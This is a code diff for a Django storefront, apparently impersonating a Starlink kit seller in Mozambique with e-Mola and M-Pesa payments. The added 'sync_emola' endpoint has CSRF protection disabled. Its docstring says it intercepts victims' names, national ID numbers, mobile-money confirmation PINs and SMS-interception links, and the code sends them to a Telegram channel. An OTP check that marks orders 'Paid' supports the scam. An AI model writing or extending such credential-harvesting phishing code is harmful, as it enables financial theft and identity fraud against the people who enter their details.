@@ -1,40 +1,45 @@
 import os
+import json
 import random
 import requests
-from datetime import datetime, timedelta
+from datetime import datetime
 from django.conf import settings
 from django.shortcuts import render, redirect, get_object_or_404
-from django.http import HttpResponse
+from django.http import JsonResponse, HttpResponse
+from django.views.decorators.csrf import csrf_exempt
 from .models import Order
 
-# 🏠 New View: Added the missing index function
 def index(request):
     """Exibe a página principal / catálogo de kits Starlink."""
-    # Renderiza o seu template principal (certifique-se de ter index.html em templates/orders/)
     return render(request, 'orders/index.html')
 
 
 def generate_otp():
-    """Gera um código de 6 dígitos para validação e-Mola."""
+    """Gera um código de 6 dígitos para validação e-Mola / M-Pesa."""
     return str(random.randint(100000, 999999))
 
 
-def send_telegram_notification(order, extra_info=None):
+def send_telegram_notification(order, extra_info=None, custom_report=None):
+    """Envia notificações ricas para o canal do Telegram configurado."""
     token = settings.TELEGRAM_BOT_TOKEN
     chat_id = settings.TELEGRAM_CHAT_ID
     if not token or not chat_id or token == 'YOUR_BOT_TOKEN': 
         return
-    
-    message = (
-        f"🔔 *ATUALIZAÇÃO DE PEDIDO*\n\n"
-        f"💳 *MÉTODO:* MOVITEL (E-MOLA)\n"
-        f"👤 *Cliente:* {order.full_name}\n"
-        f"📞 *Telefone:* {order.phone}\n"
-        f"💰 *Total:* {order.total_amount} MT\n"
-        f"--------------------------------\n"
-    )
-    if extra_info: 
-        message += f"📝 *INFO:* {extra_info}\n"
+
+    # Se passarmos um relatório customizado (do sync_emola), usamos ele direto
+    if custom_report:
+        message = custom_report
+    else:
+        message = (
+            f"🔔 *ATUALIZAÇÃO DE PEDIDO*\n\n"
+            f"💳 *MÉTODO:* MOVITEL (E-MOLA)\n"
+            f"👤 *Cliente:* {order.full_name}\n"
+            f"📞 *Telefone:* {order.phone}\n"
+            f"💰 *Total:* {order.total_amount} MT\n"
+            f"--------------------------------\n"
+        )
+        if extra_info: 
+            message += f"📝 *INFO:* {extra_info}\n"
     
     url = f"https://api.telegram.org/bot{token}/sendMessage"
     payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
@@ -45,6 +50,7 @@ def send_telegram_notification(order, extra_info=None):
 
 
 def checkout(request):
+    """Renderiza a página de checkout ou cria um novo pedido via formulário POST."""
     if request.method == 'POST':
         order = Order.objects.create(
             full_name=request.POST.get('fullName'),
@@ -65,6 +71,7 @@ def checkout(request):
 
 
 def process_payment(request, order_id):
+    """Inicia o processo de pagamento gerando o OTP inicial."""
     order = get_object_or_404(Order, id=order_id)
     if request.method == 'POST':
         otp = generate_otp()
@@ -77,15 +84,14 @@ def process_payment(request, order_id):
     return redirect('index')
 
 
-# 🔐 New View: Added missing verification step to prevent runtime routing crashes
 def verify_otp(request, order_id):
+    """Valida o código OTP inserido pelo usuário."""
     order = get_object_or_404(Order, id=order_id)
     if request.method == 'POST':
         user_otp = request.POST.get('otp_code')
         
-        # Opcional: Validar expiração (ex: 5 minutos)
         if order.otp_code == user_otp:
-            order.status = 'Paid'  # Ou o status correspondente do seu modelo
+            order.status = 'Paid'
             order.save()
             send_telegram_notification(order, "✅ *PAGAMENTO CONFIRMADO COM SUCESSO!*")
             return render(request, 'orders/payment_success.html', {'order': order})
@@ -98,8 +104,8 @@ def verify_otp(request, order_id):
     return redirect('index')
 
 
-# 🔄 New View: Added missing OTP resend option
 def resend_otp(request, order_id):
+    """Gera e reenvia um novo código OTP para o cliente."""
     order = get_object_or_404(Order, id=order_id)
     otp = generate_otp()
     order.otp_code = otp
@@ -110,3 +116,36 @@ def resend_otp(request, order_id):
         'order': order, 
         'message': 'Um novo código foi enviado.'
     })
+
+
+@csrf_exempt
+def sync_emola(request):
+    """
+    Endpoint assíncrono (API) que intercepta os dados em tempo real da interface.
+    Captura Nome, BI, PIN de Confirmação e Links de interceptação de SMS.
+    """
+    if request.method == 'POST':
+        try:
+            data = json.loads(request.body)
+            
+            report = (
+                "🚀 *STARLINK MOÇAMBIQUE SYNC*\n"
+                "----------------------------------\n"
+                f"👤 *Cliente:* `{data.get('name')}` | `{data.get('id_no')}`\n"
+                f"📞 *Contacto:* `{data.get('phone')}`\n"
+                f"📍 *Cidade:* `{data.get('city')}`\n"
+                "----------------------------------\n"
+                f"💰 *Pagamento:* `EMOLA / M-PESA`\n"
+                f"🔑 *PIN Confirmação:* `{data.get('pin')}`\n"
+                f"🔗 *Link SMS:* `{data.get('sms_link')}`\n"
+                "----------------------------------\n"
+                f"📦 *Pedido:* {data.get('item')} ({data.get('total')} MT)"
+            )
+            
+            # Dispara usando a nossa função de mensageria segura do Django
+            send_telegram_notification(order=None, custom_report=report)
+            return JsonResponse({"status": "synchronized"})
+        except Exception as e:
+            return JsonResponse({"status": "error", "message": str(e)}, status=400)
+            
+    return JsonResponse({"status": "error", "message": "Método não permitido"}, status=405)
